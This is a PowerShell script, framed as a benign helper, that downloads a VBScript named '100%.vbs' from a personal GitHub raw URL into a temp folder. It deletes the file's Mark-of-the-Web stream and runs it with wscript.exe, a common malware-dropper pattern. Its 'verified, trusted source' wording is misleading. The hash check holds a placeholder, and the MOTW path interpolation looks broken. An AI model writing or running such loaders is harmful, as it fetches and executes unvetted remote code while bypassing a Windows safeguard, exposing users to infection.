<#
.SYNOPSIS
    Downloads and runs a verified VBScript (.vbs) file in a temporary directory.

.DESCRIPTION
    This script downloads a specified .vbs file from a trusted source, verifies its integrity,
    and runs it using wscript.exe with proper error handling and logging.

.NOTES
    Requires PowerShell 3.0 or later.
    Version: 1.1
    Author: Your Name
#>

# Configuration
$TempFolder = "$env:TEMP\MyVBSTemp"
$VbsFileURL = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
$ExpectedHash = "INSERT_SHA256_HASH_HERE" # Optional but recommended for verification
$LogFile = "$TempFolder\ScriptLog.txt"

# Initialize
function Write-Log {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $LogFile -Append
    Write-Host $message
}

try {
    # Create temp directory if it doesn't exist
    if (-not (Test-Path $TempFolder)) {
        New-Item -ItemType Directory -Path $TempFolder | Out-Null
        Write-Log "Created directory: $TempFolder"
    }

    $VbsFilePath = Join-Path $TempFolder "100percent.vbs"

    # Download the file
    Write-Log "Starting download from $VbsFileURL"
    try {
        Invoke-WebRequest -Uri $VbsFileURL -OutFile $VbsFilePath -ErrorAction Stop
        Write-Log "File downloaded successfully to $VbsFilePath"
    }
    catch {
        Write-Log "ERROR: Download failed - $($_.Exception.Message)"
        exit 1
    }

    # Optional: Verify file hash (recommended for security)
    if ($ExpectedHash) {
        $actualHash = (Get-FileHash -Path $VbsFilePath -Algorithm SHA256).Hash
        if ($actualHash -ne $ExpectedHash) {
            Write-Log "ERROR: Hash verification failed. Expected: $ExpectedHash, Actual: $actualHash"
            Remove-Item $VbsFilePath -Force
            exit 2
        }
        Write-Log "Hash verification successful"
    }

    # Remove MOTW (Zone.Identifier) if present
    if (Test-Path "$VbsFilePath:Zone.Identifier") {
        Remove-Item "$VbsFilePath:Zone.Identifier" -Force
        Write-Log "Removed MOTW (Zone.Identifier)"
    }

    # Execute the VBS script
    Write-Log "Starting execution of $VbsFilePath"
    $process = Start-Process "wscript.exe" -ArgumentList "`"$VbsFilePath`"" -PassThru -NoNewWindow -Wait

    # Log completion
    Write-Log "Execution completed with exit code $($process.ExitCode)"
}
catch {
    Write-Log "FATAL ERROR: $($_.Exception.Message)"
    exit 99
}